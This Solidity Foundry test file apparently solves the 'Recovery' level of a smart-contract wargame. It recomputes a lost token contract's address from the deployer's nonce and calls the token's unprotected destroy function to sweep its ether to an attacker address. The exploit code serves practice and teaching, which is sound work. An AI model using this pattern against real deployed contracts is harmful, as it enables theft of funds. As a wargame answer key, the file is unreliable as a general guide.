// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Recovery, SimpleToken} from "../../src/Recovery/Recovery.sol";

contract RecoveryTest is LevelFactory {
  Recovery recovery; 

  function setUp() public {
    vm.startPrank(deployer, deployer);
    recovery = new Recovery();
    address(recovery).call(abi.encodeWithSignature("generateToken(string,uint256)", "fether", 100));
    address tokenAddress = addressFrom(address(recovery), 1);
    vm.deal(address(tokenAddress), 0.001 ether);
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("Recovery");
  }

  function _performTest() internal override {
    address tokenAddress = addressFrom(address(recovery), 1);

    (bool success, ) = tokenAddress.call(abi.encodeWithSignature("destroy(address)", payable(attacker)));

    assert(success);
  }

  function addressFrom(address _origin, uint _nonce) public pure returns (address) {
    bytes memory data;
    if (_nonce <= 0x7f)     data = abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce));
    else if (_nonce <= 0xff)     data = abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce));
    else if (_nonce <= 0xffff)   data = abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce));
    else if (_nonce <= 0xffffff) data = abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce));
    else                         data = abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce));
    return address(uint256(keccak256(data)));
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    address tokenAddress = addressFrom(address(recovery), 1);
    assertNull(tokenAddress.balance);

    return tokenAddress.balance == 0;  
  }
}
